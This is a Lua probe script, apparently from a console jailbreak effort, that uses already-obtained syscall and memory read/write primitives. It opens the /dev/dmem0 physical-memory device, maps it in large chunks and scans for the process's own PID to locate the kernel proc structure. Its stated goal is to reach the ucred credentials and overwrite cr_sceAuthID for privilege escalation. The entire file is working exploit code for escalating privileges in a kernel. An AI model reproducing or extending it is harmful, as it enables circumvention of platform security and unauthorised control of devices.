-- CRASH_CLASS: LOW
-- PROBE 552n: Fast PID scan across dmem0 physical memory
--
-- Map large chunks of dmem0, scan for our PID value.
-- If we find the proc structure, the ucred pointer is nearby.
-- Modifying ucred.cr_sceAuthID → privilege escalation.
--
-- Key: map 16MB chunks (not per-page) for speed.

print("=== PROBE 552n: Fast PID scan in physical memory ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_open = mk(5)

-- Open dmem0
local devpath = memory.alloc(32)
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)
local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
if dmem_fd < 0 then print("FAIL: open"); return end

-- Test: can we map a large chunk?
print("")
print("[1] Testing large mmap on dmem0...")
local chunk_size = 0x1000000  -- 16MB
local test_map = nil
local ok_t, rv_t = pcall(function()
    return sc_mmap(uint64(0), uint64(chunk_size), uint64(1),
        uint64(1), uint64(dmem_fd), uint64(0))
end)
if ok_t and N(rv_t) ~= -1 then
    local rh = get_hi_lo(rv_t)
    if rh < 0 then rh = rh + 0x100000000 end
    if rh ~= 0xFFFFFFFF then
        test_map = rv_t
        print(string.format("  16MB map at offset 0: %s OK", fmt(rv_t)))
        -- Verify readability
        local d = rd(N(rv_t))
        print(string.format("  first dword: 0x%X", d or 0))
        pcall(function() sc_munmap(test_map, uint64(chunk_size)) end)
    else
        print("  MAP_FAILED for 16MB")
        chunk_size = 0x100000  -- fall back to 1MB
        print("  falling back to 1MB chunks")
    end
else
    print("  MAP_FAILED for 16MB, trying smaller")
    chunk_size = 0x100000
end

-- Step 2: Scan physical memory for PID
print("")
print(string.format("[2] Scanning for pid=%d across dmem0 pool...", pid))
print(string.format("  chunk_size=0x%X", chunk_size))
io.flush()

local total_found = 0
local pid_locations = {}
local kptr_locations = {}
local max_scan = 0x20000000  -- 512MB first pass

local offset = 0
local chunks_scanned = 0

while offset < max_scan do
    if not alive() then break end

    local off_u = uint64(string.format("0x%X", offset))
    local ok_m, map_addr = pcall(function()
        return sc_mmap(uint64(0), uint64(chunk_size), uint64(1),
            uint64(1), uint64(dmem_fd), off_u)
    end)

    if ok_m and N(map_addr) ~= -1 then
        local rh = get_hi_lo(map_addr)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then
            local base = N(map_addr)

            -- Scan for PID (dword scan)
            for pg_off = 0, chunk_size - 4, 4 do
                local d = rd(base + pg_off)
                if d == pid then
                    local phys_addr = offset + pg_off
                    table.insert(pid_locations, phys_addr)
                    total_found = total_found + 1

                    if total_found <= 30 then
                        print(string.format("  PID at phys 0x%X", phys_addr))
                        -- Context: dump surrounding qwords
                        local ctx_start = pg_off - 64
                        if ctx_start < 0 then ctx_start = 0 end
                        local ctx_end = pg_off + 128
                        if ctx_end > chunk_size then ctx_end = chunk_size end

                        local has_kptr = false
                        local has_name = false
                        for ctx = ctx_start, ctx_end - 8, 8 do
                            local v = rq(base + ctx)
                            if v then
                                local vh, vl = get_hi_lo(v)
                                if vh < 0 then vh = vh + 0x100000000 end
                                -- Kernel pointer check (exclude NaN-boxed)
                                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                                    local exp = math.floor(vh / 0x100000) % 0x800
                                    if exp ~= 0x7FF then
                                        has_kptr = true
                                        if total_found <= 10 then
                                            print(string.format("    ctx +%d: %s (KPTR!)",
                                                ctx - pg_off, fmt(v)))
                                        end
                                    end
                                end
                            end
                        end

                        -- Check for process name near PID
                        for nameoff = -256, 256, 4 do
                            if pg_off + nameoff >= 0 and pg_off + nameoff + 8 < chunk_size then
                                local d1 = rd(base + pg_off + nameoff)
                                -- "eboot" = 0x6F6F6265 0x0000742E
                                if d1 == 0x6F6F6265 then
                                    local d2 = rd(base + pg_off + nameoff + 4)
                                    if d2 then
                                        local name = ""
                                        for ni = 0, 19 do
                                            local nb = rd(base + pg_off + nameoff + ni)
                                            if nb then
                                                local c = nb % 256
                                                if c == 0 then break end
                                                if c >= 32 and c < 127 then
                                                    name = name .. string.char(c)
                                                end
                                            end
                                        end
                                        if #name > 3 then
                                            has_name = true
                                            print(string.format("    name at +%d: '%s'",
                                                nameoff, name))
                                        end
                                    end
                                end
                            end
                        end

                        if has_kptr then
                            print("    *** HAS KERNEL POINTERS — PROC CANDIDATE ***")
                        end
                    end
                end
            end

            pcall(function() sc_munmap(map_addr, uint64(chunk_size)) end)
        end
    end

    offset = offset + chunk_size
    chunks_scanned = chunks_scanned + 1
    if chunks_scanned % 8 == 0 then
        io.flush()
    end
end

print("")
print("=== SUMMARY ===")
print(string.format("scanned: 0x%X bytes (%d chunks)", offset, chunks_scanned))
print(string.format("PID matches: %d", total_found))
for i, loc in ipairs(pid_locations) do
    if i <= 50 then
        print(string.format("  phys 0x%X", loc))
    end
end

print("")
print("alive=" .. tostring(alive()))
print("DONE")
